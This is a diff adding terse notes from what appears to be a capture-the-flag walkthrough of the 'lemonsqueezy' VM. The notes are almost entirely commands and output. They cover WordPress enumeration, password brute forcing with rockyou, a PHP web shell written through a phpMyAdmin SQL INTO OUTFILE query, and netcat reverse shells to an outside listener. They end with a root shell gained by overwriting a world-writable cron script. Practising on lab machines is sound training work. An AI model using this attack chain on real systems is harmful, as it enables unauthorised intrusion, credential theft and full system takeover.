@@ -1,0 +1,133 @@
+└─$ nmap -A -p 80 192.168.178.133
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 00:13 PDT
+Nmap scan report for 192.168.178.133
+Host is up (0.00080s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.25 (Debian)
+MAC Address: 00:0C:29:E2:78:CF (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+
+└─$ sudo dirsearch -u http://192.168.178.133/wordpress
+
+[00:22:39] 200 -    3KB - /wordpress/readme.html
+[00:22:45] 301 -  331B  - /wordpress/wp-admin  ->  http://192.168.178.133/wordpress/wp-admin/
+[00:22:45] 200 -    0B  - /wordpress/wp-config.php
+[00:22:45] 200 -    1B  - /wordpress/wp-admin/admin-ajax.php
+[00:22:45] 302 -    0B  - /wordpress/wp-admin/  ->  http://lemonsqueezy/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.178.133%2Fwordpress%2Fwp-admin%2F&reauth=1
+[00:22:45] 500 -    4KB - /wordpress/wp-admin/setup-config.php
+[00:22:45] 200 -  538B  - /wordpress/wp-admin/install.php
+[00:22:45] 301 -  333B  - /wordpress/wp-content  ->  http://192.168.178.133/wordpress/wp-content/
+[00:22:45] 200 -    0B  - /wordpress/wp-content/
+[00:22:45] 500 -    0B  - /wordpress/wp-content/plugins/hello.php
+[00:22:45] 200 -   84B  - /wordpress/wp-content/plugins/akismet/akismet.php
+[00:22:45] 200 -  424B  - /wordpress/wp-content/uploads/
+[00:22:46] 200 -  424B  - /wordpress/wp-content/upgrade/
+[00:22:46] 301 -  334B  - /wordpress/wp-includes  ->  http://192.168.178.133/wordpress/wp-includes/
+[00:22:46] 500 -    0B  - /wordpress/wp-includes/rss-functions.php
+[00:22:46] 200 -    0B  - /wordpress/wp-cron.php
+[00:22:46] 302 -    0B  - /wordpress/wp-signup.php  ->  http://lemonsqueezy/wordpress/wp-login.php?action=register
+[00:22:46] 200 -    1KB - /wordpress/wp-login.php
+[00:22:48] 405 -   42B  - /wordpress/xmlrpc.php
+[00:23:03] 200 -    4KB - /wordpress/wp-includes/
+
+─$ wpscan --url http://192.168.178.133/wordpress -e
+[i] User(s) Identified:
+
+[+] orange
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] lemon
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+─$ sudo wpscan --url http://192.168.178.133/wordpress --usernames orange,lemon -P /home/ed/Downloads/rockyou.txt
+[+] Performing password attack on Xmlrpc against 2 user/s
+[SUCCESS] - orange / ginger                                                                                                                                     
+^Cying lemon / jerapah Time: 00:08:59 <                                                                               > (85445 / 28688947)  0.29%  ETA: 50:12:01
+[!] Valid Combinations Found:
+ | Username: orange, Password: ginger
+
+http://lemonsqueezy/wordpress/wp-admin/post.php?post=5&action=edit
+Permalink: http://lemonsqueezy/wordpress/index.php/2020/04/13/keep-this-safe/ ‎
+n0t1n@w0rdl1st!
+
+//after tried on phpmyadmin, it is passwd of orange
+//login in phpmyadmin, we modify passwd of lemon(admin of wordpress) to the same as orange
+//tried to modify the template php file, failed, tried to upload vulnerable plugins , failed again.
+
+//back to phpmyadmin,in the query box,
+SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/wordpress/1.php" 
+//then visit 1.php
+
+http://lemonsqueezy/wordpress/1.php?cmd=which%20nc
+/bin/nc 
+
+http://lemonsqueezy/wordpress/1.php?cmd=nc%20192.168.178.129%208821%20-e%20/bin/bash
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.178.129] from (UNKNOWN) [192.168.178.134] 37434
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@lemonsqueezy:/var/www/html/wordpress$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@lemonsqueezy:/var/www/html/wordpress$ cat /etc/passwd | grep bash
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+orange:x:1000:1000:orange,,,:/home/orange:/bin/bash
+
+www-data@lemonsqueezy:/var/www$ cat user.txt
+cat user.txt
+TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH
+
+
+./linpeas.sh
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
+/usr/bin/gettext.sh
+
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/2 *   * * *   root    /etc/logrotate.d/logrotate
+#
+www-data@lemonsqueezy:/var/www/html/wordpress$ ls -la /etc/logrotate.d/logrotate
+<w/html/wordpress$ ls -la /etc/logrotate.d/logrotate
+-rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
+
+
+echo "nc 192.168.178.129 8822 -e /bin/bash" > /etc/logrotate.d/logrotate
+
+└─$ nc -nvlp 8822
+listening on [any] 8822 ...
+connect to [192.168.178.129] from (UNKNOWN) [192.168.178.134] 44480
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+root.txt
+cat root.txt
+NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
+
